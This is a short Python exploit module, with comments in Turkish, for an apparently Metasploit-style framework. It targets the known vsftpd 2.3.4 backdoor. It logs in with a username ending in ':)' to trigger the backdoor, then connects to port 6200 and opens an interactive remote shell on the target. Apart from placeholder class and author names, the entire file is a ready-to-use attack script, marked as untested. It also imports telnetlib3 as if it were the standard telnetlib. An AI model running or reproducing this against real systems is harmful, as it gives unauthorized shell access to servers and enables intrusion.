# vsftpd 2.3.4 için exploit modülü
# test edilmedi henüz, teoride çalışıyor.
from typing import Dict, Any
from core.module import BaseModule
from core.option import Option
from telnetlib3 import Telnet 

class ExampleModule(BaseModule):
    Name = "example_module"
    Description = "Bu, 'example' kategorisi altında bulunan örnek bir modüldür."
    Author = "YourName"
    Category = "exploit" 
    def __init__(self):
        super().__init__()
        self.Options = {
            "TARGET_HOST": Option("TARGET_HOST", None, True, "Hedef ana bilgisayar adı veya IP adresi."),
            "TARGET_PORT": Option("TARGET_PORT", 21, True, "Hedef port numarası.", regex_check=True, regex=r"^\d+$"),
        }
        for option_name, option_obj in self.Options.items():
            setattr(self, option_name, option_obj.value)
    def run(self, options: Dict[str, Any]):
        print(f"[{self.Name}] Hedef: {options.get('TARGET_HOST')}:{options.get('TARGET_PORT')}")
        user="USER nergal:)"
        password="PASS pass"

        tn=Telnet(options.get("TARGET_HOST"), options.get("TARGET_PORT"))
        tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"password.") #if necessary, edit this line
        tn.write(password.encode('ascii') + b"\n")

        tn2=Telnet(options.get("TARGET_HOST"), 6200)
        print('Success, shell opened')
        print('Send `exit` to quit shell')
        tn2.interact()
